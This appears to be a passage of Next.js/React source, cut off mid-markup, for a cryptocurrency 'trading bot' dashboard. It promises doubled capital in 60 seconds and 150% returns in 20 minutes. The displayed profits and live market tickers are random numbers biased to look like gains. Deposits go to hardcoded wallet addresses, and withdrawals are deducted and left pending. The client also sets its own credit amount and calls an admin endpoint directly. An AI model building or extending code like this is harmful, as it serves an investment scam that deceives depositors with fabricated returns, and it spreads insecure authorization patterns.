'use client'

import { useState, useEffect, useRef } from 'react'
import { useRouter } from 'next/navigation'
import {
  AreaChart, Area, XAxis, YAxis, Tooltip,
  ResponsiveContainer, ReferenceLine,
} from 'recharts'
import { supabase } from '@/lib/supabase'

const G = {
  gold: '#F5C518',
  goldDim: 'rgba(245,197,24,0.10)',
  goldBorder: 'rgba(245,197,24,0.22)',
  bg: '#070707',
  bg2: 'rgba(255,255,255,0.03)',
  bg3: 'rgba(255,255,255,0.055)',
  border: 'rgba(255,255,255,0.07)',
  muted: '#444',
  sec: '#777',
  text: '#e8e8e8',
  green: '#16a34a',
  greenBg: 'rgba(22,163,74,0.10)',
  greenText: '#4ade80',
  red: '#dc2626',
  redBg: 'rgba(220,38,38,0.10)',
  redText: '#f87171',
}

const COIN_LOGOS: Record<string, string> = {
  BTC:  'https://assets.coingecko.com/coins/images/1/thumb/bitcoin.png',
  USDT: 'https://assets.coingecko.com/coins/images/325/thumb/Tether-logo.png',
}

const BOTS = [
  {
    id: 'sprint',
    name: 'Sprint Bot',
    icon: '⚡',
    tag: '60 SEC',
    duration: 60,
    returnRate: 1.0,
    min: 50,
    max: 499,
    color: '#4ade80',
    colorDim: 'rgba(74,222,128,0.10)',
    colorBorder: 'rgba(74,222,128,0.25)',
    tickMs: 500,
    description: 'Doubles your capital in 60 seconds',
    badge: 'FAST',
  },
  {
    id: 'titan',
    name: 'Titan Vault',
    icon: '👑',
    tag: '20 MIN',
    duration: 1200,
    returnRate: 1.5,
    min: 500,
    max: 9_999_999,
    color: '#F5C518',
    colorDim: 'rgba(245,197,24,0.10)',
    colorBorder: 'rgba(245,197,24,0.22)',
    tickMs: 1000,
    description: '150% return on premium high-stake positions',
    badge: 'HIGH STAKE',
  },
]

const TICKERS_BASE = [
  { sym: 'BTC',   price: 83420,  change:  2.41 },
  { sym: 'ETH',   price: 3210,   change:  1.87 },
  { sym: 'BNB',   price: 605,    change: -0.53 },
  { sym: 'SOL',   price: 178,    change:  3.22 },
  { sym: 'XRP',   price: 0.62,   change: -1.14 },
  { sym: 'ADA',   price: 0.48,   change:  0.91 },
  { sym: 'DOGE',  price: 0.14,   change:  1.55 },
  { sym: 'MATIC', price: 0.78,   change: -0.88 },
]

const WALLET_ADDRESSES: Record<string, string> = {
  BTC:  '1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf',
  USDT: 'TN3W4xx8BdkJ3DxBZMB5MjY3Q5S7JB7mZ',
}

function validateAddress(address: string, network: 'BTC' | 'USDT') {
  if (!address) return false
  if (network === 'BTC')  return /^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$|^bc1[a-z0-9]{39,59}$/.test(address)
  if (network === 'USDT') return /^T[a-zA-Z0-9]{33}$/.test(address)
  return false
}

function fmtCountdown(sec: number) {
  const m = Math.floor(sec / 60)
  const s = sec % 60
  return m > 0 ? `${m}:${String(s).padStart(2, '0')}` : `${s}s`
}

function CoinButton({
  coin, label, selected, onClick,
}: { coin: 'BTC' | 'USDT'; label: string; selected: boolean; onClick: () => void }) {
  const accent = coin === 'BTC' ? '#f7931a' : '#26a17b'
  return (
    <button onClick={onClick} style={{
      padding: '12px 16px', borderRadius: 12, width: '100%', cursor: 'pointer',
      border: `1px solid ${selected ? accent + '88' : G.border}`,
      background: selected ? accent + '14' : 'transparent',
      display: 'flex', alignItems: 'center', gap: 12,
    }}>
      <img src={COIN_LOGOS[coin]} alt={coin} style={{ width: 32, height: 32, borderRadius: '50%', objectFit: 'cover', flexShrink: 0 }} />
      <div style={{ textAlign: 'left', flex: 1 }}>
        <div style={{ fontSize: 14, fontWeight: 800, color: selected ? G.text : G.muted }}>{coin}</div>
        <div style={{ fontSize: 11, color: G.sec, marginTop: 1 }}>{label}</div>
      </div>
      <div style={{
        width: 20, height: 20, borderRadius: '50%', flexShrink: 0,
        border: `2px solid ${selected ? accent : G.border}`,
        background: selected ? accent + '22' : 'transparent',
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        fontSize: 11, color: accent, fontWeight: 700,
      }}>{selected ? '✓' : ''}</div>
    </button>
  )
}

export default function Dashboard() {
  const router = useRouter()

  const [user,     setUser]     = useState<any>(null)
  const [wallet,   setWallet]   = useState<any>(null)
  const [sessions, setSessions] = useState<any[]>([])
  const [deposits, setDeposits] = useState<any[]>([])
  const [view,     setView]     = useState<'home' | 'deposit'>('home')
  const [loading,  setLoading]  = useState(true)
  const [isMobile, setIsMobile] = useState(false)

  const [tickers, setTickers] = useState(TICKERS_BASE)

  const [currency,       setCurrency]       = useState<'BTC' | 'USDT'>('USDT')
  const [depositAmount,  setDepositAmount]  = useState('')
  const [depositLoading, setDepositLoading] = useState(false)
  const [depositDone,    setDepositDone]    = useState(false)

  const [selectedBot,  setSelectedBot]  = useState(BOTS[0])
  const [tradeAmount,  setTradeAmount]  = useState('')
  const [targetProfit, setTargetProfit] = useState('')
  const [targetLoss,   setTargetLoss]   = useState('')
  const [tradeLoading, setTradeLoading] = useState(false)
  const [tradeError,   setTradeError]   = useState('')

  const [simulatedPnl,  setSimulatedPnl]  = useState(0)
  const [pnlHistory,    setPnlHistory]    = useState<{ t: string; p: number }[]>([{ t: '0', p: 0 }])
  const [targetReached, setTargetReached] = useState(false)
  const [countdown,     setCountdown]     = useState(0)
  const [activeBotType, setActiveBotType] = useState('sprint')
  const simRef   = useRef<NodeJS.Timeout | null>(null)
  const cdownRef = useRef<NodeJS.Timeout | null>(null)

  const [showWithdrawModal, setShowWithdrawModal] = useState(false)
  const [withdrawNetwork,   setWithdrawNetwork]   = useState<'BTC' | 'USDT'>('USDT')
  const [withdrawAmount,    setWithdrawAmount]     = useState('')
  const [withdrawAddress,   setWithdrawAddress]    = useState('')
  const [withdrawLoading,   setWithdrawLoading]    = useState(false)
  const [withdrawDone,      setWithdrawDone]       = useState(false)
  const [addressError,      setAddressError]       = useState('')

  const [chartData] = useState(() => {
    let p = 1000
    return Array.from({ length: 60 }, (_, i) => {
      p += (Math.random() - 0.45) * 20
      return { t: String(i), p: Math.max(p, 800) }
    })
  })

  useEffect(() => {
    const check = () => setIsMobile(window.innerWidth < 768)
    check()
    window.addEventListener('resize', check)
    return () => window.removeEventListener('resize', check)
  }, [])

  useEffect(() => {
    const iv = setInterval(() => {
      setTickers(prev => prev.map(t => ({
        ...t,
        price:  +(t.price  * (1 + (Math.random() - 0.5) * 0.0008)).toFixed(t.price < 5 ? 4 : 2),
        change: +(t.change +  (Math.random() - 0.5) * 0.08).toFixed(2),
      })))
    }, 2000)
    return () => clearInterval(iv)
  }, [])

  const loadData = async (uid: string) => {
    const { data: w } = await supabase.from('wallets').select('*').eq('user_id', uid).single()
    setWallet(w)
    const { data: s } = await supabase.from('bot_sessions').select('*').eq('user_id', uid).order('started_at', { ascending: false })
    setSessions(s ?? [])
    const { data: d } = await supabase.from('deposits').select('*').eq('user_id', uid).order('created_at', { ascending: false })
    setDeposits(d ?? [])
  }

  useEffect(() => {
    const load = async () => {
      const { data: { user } } = await supabase.auth.getUser()
      if (!user) { router.push('/login'); return }
      setUser(user)
      await loadData(user.id)
      setLoading(false)
    }
    load()
  }, [router])

  const balance       = wallet?.balance ?? 0
  const activeSession = sessions.find(s => s.status === 'active')
  const totalPnl      = sessions.reduce((acc, s) => acc + (s.current_pnl ?? 0), 0)

  useEffect(() => {
    if (!activeSession) return
    const stored = localStorage.getItem(`bot_type_${activeSession.id}`)
    setActiveBotType(stored || 'sprint')
  }, [activeSession?.id])

  useEffect(() => {
    if (!activeSession) return
    setTargetReached(false)

    const botDef     = BOTS.find(b => b.id === activeBotType) || BOTS[0]
    const target     = activeSession.target_profit
    const stopLoss   = activeSession.target_loss
    const totalTicks = (botDef.duration * 1000) / botDef.tickMs
    let current      = activeSession.current_pnl ?? 0
    let tick         = 0
    let remaining    = botDef.duration

    setCountdown(remaining)
    setSimulatedPnl(+current.toFixed(2))
    setPnlHistory([{ t: '0', p: +current.toFixed(2) }])

    cdownRef.current = setInterval(() => {
      remaining = Math.max(0, remaining - 1)
      setCountdown(remaining)
    }, 1000)

    simRef.current = setInterval(() => {
      tick++
      const progress = Math.min(tick / totalTicks, 1)
      const isTitan  = botDef.id === 'titan'
      const trend    = target * progress * (isTitan ? 0.010 : 0.022)
      const noise    = (Math.random() - 0.40) * (target * (isTitan ? 0.018 : 0.055))
      current        = Math.max(-stopLoss * 0.8, current + trend + noise)
      current        = Math.min(current, target)

      setSimulatedPnl(+current.toFixed(2))
      setPnlHistory(prev => [...prev, { t: String(tick), p: +current.toFixed(2) }].slice(-80))

      if (current >= target) {
        clearInterval(simRef.current!)
        clearInterval(cdownRef.current!)
        setCountdown(0)
        setTargetReached(true)
      }
    }, botDef.tickMs)

    return () => {
      if (simRef.current)   clearInterval(simRef.current)
      if (cdownRef.current) clearInterval(cdownRef.current)
    }
  }, [activeSession?.id, activeBotType])

  useEffect(() => {
    const amt = parseFloat(tradeAmount)
    if (!amt || isNaN(amt)) { setTargetProfit(''); return }
    setTargetProfit((amt * selectedBot.returnRate).toFixed(2))
  }, [tradeAmount, selectedBot])

  const handleDeposit = async () => {
    const amt = parseFloat(depositAmount)
    if (!amt || amt < 85) { alert('Minimum deposit is $85'); return }
    setDepositLoading(true)
    await supabase.from('deposits').insert({ user_id: user.id, currency, amount: amt })
    setDepositLoading(false)
    setDepositDone(true)
  }

  const handleTrade = async () => {
    setTradeError('')
    const amt = parseFloat(tradeAmount)
    const tp  = parseFloat(targetProfit)
    const tl  = parseFloat(targetLoss)
    if (!amt || !tp || !tl)    { setTradeError('Fill all fields.'); return }
    if (amt > balance)         { setTradeError('Insufficient wallet balance.'); return }
    if (amt < selectedBot.min) { setTradeError(`Minimum for ${selectedBot.name} is $${selectedBot.min}.`); return }
    if (amt > selectedBot.max) { setTradeError(`Maximum for ${selectedBot.name} is $${selectedBot.max}.`); return }

    setTradeLoading(true)
    const { data: botRow } = await supabase.from('bots').select('id').eq('name', selectedBot.name).single()
    const { data: newSession } = await supabase
      .from('bot_sessions')
      .insert({ user_id: user.id, bot_id: botRow?.id ?? null, amount: amt, target_profit: tp, target_loss: tl })
      .select()
      .single()

    if (newSession?.id) localStorage.setItem(`bot_type_${newSession.id}`, selectedBot.id)

    await fetch('/api/wallet/deduct', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ userId: user.id, amount: amt }),
    })
    setTradeLoading(false)
    setTradeAmount('')
    setTargetProfit('')
    setTargetLoss('')
    setTradeError('')
    await loadData(user.id)
  }

  const handleCloseSession = async () => {
    if (!activeSession) return
    await fetch('/api/admin/stop-session', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ sessionId: activeSession.id }),
    })
    await fetch('/api/wallet/credit', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ userId: user.id, amount: activeSession.amount + simulatedPnl }),
    })
    await loadData(user.id)
    setSessions(prev => prev.map(s => s.id === activeSession.id ? { ...s, status: 'completed' } : s))
  }

  const handleWithdraw = async () => {
    setAddressError('')
    if (!withdrawAmount || !withdrawAddress) return
    const amt = parseFloat(withdrawAmount)
    if (amt < 10)      { alert('Minimum withdrawal is $10'); return }
    if (amt > balance) { alert('Insufficient balance'); return }
    if (!validateAddress(withdrawAddress, withdrawNetwork)) {
      setAddressError(`Invalid ${withdrawNetwork} address`)
      return
    }
    setWithdrawLoading(true)
    await supabase.from('withdrawals').insert({ user_id: user.id, amount: amt, address: withdrawAddress, status: 'pending' })
    // Deduct balance immediately
    await fetch('/api/wallet/deduct', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ userId: user.id, amount: amt }),
    })
    await loadData(user.id)
    setWithdrawLoading(false)
    setWithdrawDone(true)
  }

  const handleLogout = async () => {
    await supabase.auth.signOut()
    router.push('/login')
  }

  const pnlPercent   = activeSession
    ? Math.min(100, Math.max(0, (simulatedPnl / activeSession.target_profit) * 100))
    : 0
  const activeBotDef = BOTS.find(b => b.id === activeBotType) || BOTS[0]

  // Can user actually start trading?
  const canTrade = !activeSession && balance >= selectedBot.min

  if (loading) return (
    <div style={{ height: '100vh', background: G.bg, display: 'flex', alignItems: 'center', justifyContent: 'center', color: G.gold, fontSize: 14 }}>
      Loading...
    </div>
  )

  return (
    <div style={{ display: 'flex', flexDirection: 'column', height: '100vh', background: G.bg, color: G.text, fontFamily: "-apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif", overflow: 'hidden' }}>
      <style>{`
        @keyframes ticker { 0%{transform:translateX(0)} 100%{transform:translateX(-50%)} }
        @keyframes fadeUp { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }
        @keyframes pulse  { 0%,100%{opacity:1} 50%{opacity:0.4} }
        * { -webkit-tap-highlight-color:transparent; box-sizing:border-box; }
        input[type=number]::-webkit-inner-spin-button,
        input[type=number]::-webkit-outer-spin-button { -webkit-appearance:none; margin:0; }
      `}</style>

      {/* TICKER */}
      <div style={{ height: 34, background: 'rgba(245,197,24,0.03)', borderBottom: `1px solid ${G.goldBorder}`, display: 'flex', alignItems: 'center', overflow: 'hidden', flexShrink: 0 }}>
        <div style={{ display: 'flex', gap: 36, animation: 'ticker 28s linear infinite', whiteSpace: 'nowrap', paddingLeft: '100%' }}>
          {[...tickers, ...tickers].map((t, i) => (
            <span key={i} style={{ display: 'inline-flex', alignItems: 'center', gap: 7, fontSize: 11, fontWeight: 600 }}>
              <span style={{ color: G.muted }}>{t.sym}/USDT</span>
              <span style={{ color: G.text }}>${t.price.toLocaleString(undefined, { minimumFractionDigits: t.price < 5 ? 4 : 2 })}</span>
              <span style={{ color: t.change >= 0 ? G.greenText : G.redText }}>
                {t.change >= 0 ? '▲' : '▼'} {Math.abs(t.change).toFixed(2)}%
              </span>
            </span>
          ))}
        </div>
      </div>

      <div style={{ flex: 1, display: 'flex', overflow: 'hidden' }}>

        {/* Desktop sidebar */}
        {!isMobile && (
          <aside style={{ width: 56, borderRight: `1px solid ${G.border}`, display: 'flex', flexDirection: 'column', alignItems: 'center', paddingTop: 12, gap: 4, flexShrink: 0 }}>
            <div style={{ width: 34, height: 34, background: G.goldDim, border: `1px solid ${G.goldBorder}`, borderRadius: 9, display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 16, marginBottom: 12 }}>⚡</div>
            {(['home', 'deposit'] as const).map((key) => {
              const icons: Record<string, string> = { home: '▦', deposit: '↑' }
              const labels: Record<string, string> = { home: 'Dashboard', deposit: 'Deposit' }
              return (
                <div key={key} title={labels[key]} onClick={() => setView(key)}
                  style={{ width: 38, height: 38, borderRadius: 9, display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 16, cursor: 'pointer', background: view === key ? G.goldDim : 'transparent', color: view === key ? G.gold : G.muted, border: view === key ? `1px solid ${G.goldBorder}` : '1px solid transparent' }}>
                  {icons[key]}
                </div>
              )
            })}
            <div onClick={handleLogout} title="Logout"
              style={{ marginTop: 'auto', marginBottom: 16, width: 32, height: 32, borderRadius: '50%', background: 'rgba(255,255,255,0.08)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 13, fontWeight: 700, color: G.gold, cursor: 'pointer' }}>
              {user?.email?.[0]?.toUpperCase()}
            </div>
          </aside>
        )}

        <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>

          {/* Topbar */}
          <div style={{ height: 44, borderBottom: `1px solid ${G.border}`, display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0 16px', flexShrink: 0 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
              {isMobile && <div style={{ width: 28, height: 28, background: G.goldDim, border: `1px solid ${G.goldBorder}`, borderRadius: 7, display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 14 }}>⚡</div>}
              <span style={{ fontSize: 13, fontWeight: 700, color: G.gold, letterSpacing: '0.08em', textTransform: 'uppercase' }}>
                {view === 'home' ? 'Dashboard' : 'Deposit Funds'}
              </span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
              {balance > 0 && view === 'home' && (
                <button onClick={() => setShowWithdrawModal(true)}
                  style={{ padding: '5px 12px', borderRadius: 7, background: G.bg3, border: `1px solid ${G.border}`, color: G.text, fontSize: 11, fontWeight: 600, cursor: 'pointer' }}>
                  💸 {!isMobile && 'Withdraw'}
                </button>
              )}
              <div style={{ textAlign: 'right' }}>
                <div style={{ fontSize: 9, color: G.muted, letterSpacing: '0.06em' }}>BALANCE</div>
                <div style={{ fontSize: isMobile ? 13 : 14, fontWeight: 700, color: G.gold }}>${balance.toLocaleString(undefined, { minimumFractionDigits: 2 })}</div>
              </div>
            </div>
          </div>

          <div style={{ flex: 1, overflow: 'auto', padding: isMobile ? '12px 12px 80px' : '20px' }}>

            {/* ═══ HOME ═══ */}
            {view === 'home' && (
              <div style={{ display: 'flex', flexDirection: 'column', gap: 14, maxWidth: 900, margin: '0 auto' }}>

                {/* Stats */}
                <div style={{ display: 'grid', gridTemplateColumns: isMobile ? '1fr 1fr' : 'repeat(4, 1fr)', gap: 10 }}>
                  {[
                    { label: 'Wallet Balance',  value: `$${balance.toFixed(2)}`,                                       color: G.gold },
                    { label: 'Active Sessions', value: sessions.filter(s => s.status === 'active').length,             color: G.greenText },
                    { label: 'Total P&L',       value: `${totalPnl >= 0 ? '+' : ''}$${totalPnl.toFixed(2)}`,          color: totalPnl >= 0 ? G.greenText : G.redText },
                    { label: 'Total Deposits',  value: deposits.length,                                                 color: G.text },
                  ].map(s => (
                    <div key={s.label} style={{ background: G.bg2, border: `1px solid ${G.border}`, borderRadius: 12, padding: '14px 16px' }}>
                      <div style={{ fontSize: 10, color: G.muted, marginBottom: 5, textTransform: 'uppercase', letterSpacing: '0.06em' }}>{s.label}</div>
                      <div style={{ fontSize: isMobile ? 20 : 24, fontWeight: 800, color: s.color }}>{s.value}</div>
                    </div>
                  ))}
                </div>

                {/* ── BOT CARDS — always visible, always selectable ── */}
                <div>
                  <div style={{ fontSize: 11, color: G.muted, marginBottom: 10, textTransform: 'uppercase', letterSpacing: '0.06em' }}>Trading Bots</div>
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12 }}>
                    {BOTS.map(b => {
                      const isSelected = selectedBot.id === b.id && !activeSession
                      const isLive     = activeSession && activeBotType === b.id
                      // Always allow selection — never disable bot cards
                      return (
                        <div key={b.id}
                          onClick={() => !activeSession && setSelectedBot(b)}
                          style={{
                            padding: isMobile ? 16 : 20,
                            borderRadius: 16,
                            border: `2px solid ${isLive ? b.color : isSelected ? b.color : 'rgba(255,255,255,0.07)'}`,
                            background: (isLive || isSelected) ? b.colorDim : G.bg3,
                            cursor: activeSession ? 'default' : 'pointer',
                            transition: 'all 0.2s',
                            position: 'relative',
                            overflow: 'hidden',
                          }}>

                          {/* Badge top-right */}
                          <span style={{ position: 'absolute', top: 10, right: 10, fontSize: 8, padding: '2px 8px', borderRadius: 4, background: isLive ? 'rgba(74,222,128,0.15)' : b.colorDim, border: `1px solid ${isLive ? G.greenText : b.colorBorder}`, color: isLive ? G.greenText : b.color, fontWeight: 800, letterSpacing: '0.08em' }}>
                            {isLive ? '● LIVE' : b.badge}
                          </span>

                          <div style={{ fontSize: isMobile ? 26 : 30, marginBottom: 8 }}>{b.icon}</div>
                          <div style={{ fontSize: 15, fontWeight: 800, color: isSelected || isLive ? b.color : G.text, marginBottom: 4 }}>{b.name}</div>
                          <div style={{ fontSize: 11, color: G.muted, marginBottom: 14, lineHeight: 1.5 }}>{b.description}</div>

                          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-end' }}>
                            <div>
                              <div style={{ fontSize: isMobile ? 22 : 26, fontWeight: 900, color: b.color, lineHeight: 1 }}>+{b.returnRate * 100}%</div>
                              <div style={{ fontSize: 10, color: G.muted, marginTop: 2 }}>return</div>
                            </div>
                            <div style={{ textAlign: 'right' }}>
                              <div style={{ fontSize: 13, fontWeight: 700, color: G.text }}>{b.tag}</div>
                              <div style={{ fontSize: 10, color: G.muted }}>Min ${b.min}</div>
                            </div>
                          </div>

                          {(isSelected || isLive) && (
                            <div style={{ marginTop: 12, height: 2, background: `linear-gradient(90deg, ${b.color}, transparent)`, borderRadius: 1 }} />
                          )}
                        </div>
                      )
                    })}
                  </div>
                </div>

                {/* ── ACTIVE SESSION ── */}
                {activeSession && (
                  <div style={{ background: `linear-gradient(135deg, ${activeBotDef.colorDim} 0%, rgba(0,0,0,0) 60%)`, border: `1px solid ${targetReached ? G.greenText : activeBotDef.colorBorder}`, borderRadius: 16, padding: isMobile ? 16 : 24, position: 'relative', overflow: 'hidden', transition: 'border-color 0.5s', animation: 'fadeUp 0.3s ease' }}>
                    <div style={{ position: 'absolute', top: -80, right: -80, width: 240, height: 240, background: targetReached ? 'rgba(74,222,128,0.07)' : activeBotDef.colorDim, borderRadius: '50%', filter: 'blur(50px)', pointerEvents: 'none' }} />

                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: 16, flexWrap: 'wrap', gap: 8 }}>
                      <div>
                        <div style={{ display: 'flex', alignItems: 'center', gap: 6, marginBottom: 6 }}>
                          <span>{activeBotDef.icon}</span>
                          <span style={{ fontSize: 11, color: activeBotDef.color, textTransform: 'uppercase', letterSpacing: '0.1em', fontWeight: 700 }}>{activeBotDef.name}</span>
                          <span style={{ fontSize: 9, padding: '2px 7px', borderRadius: 4, background: activeBotDef.colorDim, border: `1px solid ${activeBotDef.colorBorder}`, color: activeBotDef.color, fontWeight: 800 }}>{activeBotDef.tag}</span>
                        </div>
                        <div style={{ fontSize: isMobile ? 28 : 34, fontWeight: 900, letterSpacing: '-0.03em' }}>
                          <span style={{ color: simulatedPnl >= 0 ? G.greenText : G.redText }}>{simulatedPnl >= 0 ? '+' : ''}${simulatedPnl.toFixed(2)}</span>
                          <span style={{ fontSize: 12, color: G.muted, fontWeight: 400, marginLeft: 8 }}>P&L</span>
                        </div>
                      </div>
                      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-end', gap: 6 }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: 6, background: G.greenBg, border: `1px solid ${G.green}`, borderRadius: 20, padding: '4px 12px' }}>
                          <div style={{ width: 6, height: 6, borderRadius: '50%', background: G.greenText, animation: 'pulse 1.5s infinite', boxShadow: `0 0 8px ${G.greenText}` }} />
                          <span style={{ fontSize: 11, color: G.greenText, fontWeight: 700 }}>LIVE</span>
                        </div>
                        {!targetReached && countdown > 0 && (
                          <div style={{ fontFamily: 'monospace', fontSize: 14, fontWeight: 800, color: activeBotDef.color, background: activeBotDef.colorDim, border: `1px solid ${activeBotDef.colorBorder}`, padding: '4px 12px', borderRadius: 7 }}>
                            ⏱ {fmtCountdown(countdown)}
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Chart */}
                    <div style={{ background: 'rgba(0,0,0,0.4)', borderRadius: 12, padding: '12px 4px 4px', marginBottom: 14, position: 'relative' }}>
                      <div style={{ position: 'absolute', top: 8, left: 12, fontSize: 10, color: G.muted, textTransform: 'uppercase', letterSpacing: '0.06em' }}>Live P&L</div>
                      <ResponsiveContainer width="100%" height={isMobile ? 110 : 155}>
                        <AreaChart data={pnlHistory} margin={{ top: 20, right: 8, bottom: 0, left: 8 }}>
                          <defs>
                            <linearGradient id="pnlUp" x1="0" y1="0" x2="0" y2="1">
                              <stop offset="0%" stopColor={G.greenText} stopOpacity={0.35} />
                              <stop offset="100%" stopColor={G.greenText} stopOpacity={0} />
                            </linearGradient>
                            <linearGradient id="pnlDown" x1="0" y1="0" x2="0" y2="1">
                              <stop offset="0%" stopColor={G.redText} stopOpacity={0.35} />
                              <stop offset="100%" stopColor={G.redText} stopOpacity={0} />
                            </linearGradient>
                            <filter id="glow">
                              <feGaussianBlur stdDeviation="2" result="coloredBlur" />
                              <feMerge><feMergeNode in="coloredBlur" /><feMergeNode in="SourceGraphic" /></feMerge>
                            </filter>
                          </defs>
                          <XAxis dataKey="t" hide />
                          <YAxis hide domain={['auto', 'auto']} />
                          <Tooltip contentStyle={{ background: '#0a0a0a', border: `1px solid ${G.border}`, borderRadius: 8, fontSize: 11 }} formatter={(v: number) => [`${v >= 0 ? '+' : ''}$${v.toFixed(2)}`, 'P&L']} labelFormatter={() => ''} />
                          <ReferenceLine y={0} stroke={G.border} strokeDasharray="3 3" />
                          <Area type="monotoneX" dataKey="p" stroke={simulatedPnl >= 0 ? G.greenText : G.redText} strokeWidth={2.5} fill={simulatedPnl >= 0 ? 'url(#pnlUp)' : 'url(#pnlDown)'} dot={false} isAnimationActive={false} style={{ filter: 'url(#glow)' }} />
                        </AreaChart>
                      </ResponsiveContainer>
                    </div>

                    {/* Progress bar */}
                    <div style={{ marginBottom: 14 }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 6 }}>
                        <span style={{ fontSize: 11, color: G.muted, textTransform: 'uppercase', letterSpacing: '0.06em' }}>Progress to Target</span>
                        <span style={{ fontSize: 13, color: activeBotDef.color, fontWeight: 800 }}>{pnlPercent.toFixed(1)}%</span>
                      </div>
                      <div style={{ height: 8, background: 'rgba(255,255,255,0.05)', borderRadius: 99, overflow: 'hidden' }}>
                        <div style={{ height: '100%', width: `${pnlPercent}%`, background: `linear-gradient(90deg, ${activeBotDef.color}, ${G.greenText})`, borderRadius: 99, transition: 'width 1.2s cubic-bezier(0.4, 0, 0.2, 1)', boxShadow: '0 0 12px rgba(74,222,128,0.4)' }} />
                      </div>
                      <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: 5 }}>
                        <span style={{ fontSize: 10, color: G.muted }}>$0</span>
                        <span style={{ fontSize: 10, color: G.greenText, fontWeight: 700 }}>+${activeSession.target_profit}</span>
                      </div>
                    </div>

                    <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 8 }}>
                      {[
                        { label: 'Traded',     value: `$${activeSession.amount}`,                                                     color: G.text },
                        { label: 'Stop Loss',  value: `-$${activeSession.target_loss}`,                                               color: G.redText },
                        { label: 'Est Return', value: `+${((activeSession.target_profit / activeSession.amount) * 100).toFixed(0)}%`, color: G.greenText },
                      ].map(s => (
                        <div key={s.label} style={{ background: 'rgba(0,0,0,0.3)', borderRadius: 10, padding: '10px 12px', border: `1px solid ${G.border}` }}>
                          <div style={{ fontSize: 10, color: G.muted, marginBottom: 4, textTransform: 'uppercase', letterSpacing: '0.06em' }}>{s.label}</div>
                          <div style={{ fontSize: isMobile ? 14 : 16, fontWeight: 800, color: s.color }}>{s.value}</div>
                        </div>
                      ))}
                    </div>

                    {targetReached && (
                      <div style={{ marginTop: 14, padding: 18, background: 'linear-gradient(135deg,rgba(22,163,74,0.15),rgba(74,222,128,0.08))', border: `1px solid ${G.greenText}`, borderRadius: 12, boxShadow: '0 0 30px rgba(74,222,128,0.12)', animation: 'fadeUp 0.4s ease' }}>
                        <div style={{ fontSize: 18, fontWeight: 900, color: G.greenText, marginBottom: 6 }}>🎯 Target Reached!</div>
                        <div style={{ fontSize: 13, color: G.text, marginBottom: 14, lineHeight: 1.6 }}>
                          Profit: <span style={{ color: G.greenText, fontWeight: 700 }}>+${simulatedPnl.toFixed(2)}</span> · Total credit:{' '}
                          <span style={{ color: G.gold, fontWeight: 700 }}>${(activeSession.amount + simulatedPnl).toFixed(2)}</span>
                        </div>
                        <div style={{ display: 'flex', gap: 10 }}>
                          <button onClick={handleCloseSession}
                            style={{ flex: 1, padding: 13, borderRadius: 10, background: 'rgba(22,163,74,0.2)', border: `1px solid ${G.greenText}`, color: G.greenText, fontWeight: 800, fontSize: 13, cursor: 'pointer' }}>
                            ✅ Collect & Close
                          </button>
                          <button onClick={handleCloseSession}
                            style={{ flex: 1, padding: 13, borderRadius: 10, background: G.goldDim, border: `1px solid ${G.goldBorder}`, color: G.gold, fontWeight: 800, fontSize: 13, cursor: 'pointer' }}>
                            🔄 Trade Again
                          </button>
                        </div>
                      </div>
                    )}
                  </div>
                )}

                {/* ── CONFIGURE TRADE FORM — always shown when no active session ── */}
                {!activeSession && (
                  <div style={{ background: G.bg2, border: `1px solid ${G.border}`, borderRadius: 16, padding: isMobile ? 18 : 24, display: 'flex', flexDirection: 'column', gap: 16, animation: 'fadeUp 0.3s ease' }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: 8 }}>
                      <div>
                        <div style={{ fontSize: 16, fontWeight: 700 }}>Configure Trade</div>
                        <div style={{ fontSize: 12, color: G.muted, marginTop: 2 }}>
                          <span style={{ color: selectedBot.color, fontWeight: 700 }}>{selectedBot.icon} {selectedBot.name}</span>
                          {' · '}{selectedBot.tag}{' · '}
                          <span style={{ color: G.greenText }}>+{selectedBot.returnRate * 100}% return</span>
                        </div>
                      </div>
                      <div style={{ fontSize: 12, color: G.muted }}>
                        Available: <span style={{ color: balance > 0 ? G.gold : G.redText, fontWeight: 700 }}>${balance.toFixed(2)}</span>
                      </div>
                    </div>

                    {/* Amount input */}
                    <div>
                      <div style={{ fontSize: 11, color: G.muted, marginBottom: 8 }}>Trade Amount (USD)</div>
                      <input
                        type="number"
                        placeholder={`Min $${selectedBot.min}${selectedBot.max < 9_999_999 ? ' – Max $' + selectedBot.max : ''}`}
                        value={tradeAmount}
                        onChange={e => setTradeAmount(e.target.value)}
                        disabled={!canTrade}
                        style={{ width: '100%', background: canTrade ? G.bg3 : 'rgba(255,255,255,0.02)', border: `1px solid ${G.border}`, borderRadius: 10, padding: '14px 16px', fontSize: 16, color: canTrade ? G.text : G.muted, outline: 'none', cursor: canTrade ? 'text' : 'not-allowed' }}
                      />
                      {/* Quick picks */}
